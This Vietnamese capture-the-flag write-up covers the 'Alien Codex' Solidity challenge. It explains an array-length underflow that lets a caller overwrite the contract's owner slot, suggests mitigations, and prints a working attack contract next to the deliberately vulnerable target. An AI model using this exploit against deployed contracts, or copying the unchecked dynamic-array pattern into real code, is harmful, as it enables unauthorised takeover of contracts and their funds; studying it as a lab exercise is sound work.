### Kết luận
- Lỗ hổng: Lỗ hổng tràn bộ nhớ với mảng `codex`, hacker có thể dùng hàm retract để lùi chiều dài mảng `codex` (dùng hàm `retract`) đến nơi lưu địa chỉ của owner sau đó thực hiện ghi đè bới hàm `revise`.
- Thêm với, Hợp đồng sử dụng Ownable, nhưng lỗ hổng ghi đè địa chỉ `owner` (với `revise`) cho phép hacker thay đổi quyền sở hữu hợp đồng mà không cần qua xác thực.
- Cách phòng tránh: Không sử dụng mảng động, nên dùng mapping, giới hạn quyền truy cập nhỉ bới `owner` trong các hàm quan trọng (VD: `revise`, `retract`,..), sử dụng phiên bản sol cao hơn.
### Contract tấn công
```solidity
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";
interface IAlienCodex{
    function makeContact() external;
    function record(bytes32 _content);
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}
contract AlienCodexAttack{
    IAlienCodex public victim;
    constructor (address challenge){
        victim = IAlienCodex(challenge);
    }
    function attack(address hacker) public{
        victim.makeContact(); // cho contact = true;
        victim.retract(); 
        uint256 ownerSlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint i = 2**256 - ownerSlot;
        victim.revise(i, bytes32(uint256(uint160(hacker)))); // Ghi de owner boi dia chi nguoi tan cong.        
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
### Contract Ownable-05.sol
```solidity
pragma solidity ^0.5.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be aplied to your functions to restrict their use to
 * the owner.
 */
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * > Note: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
```
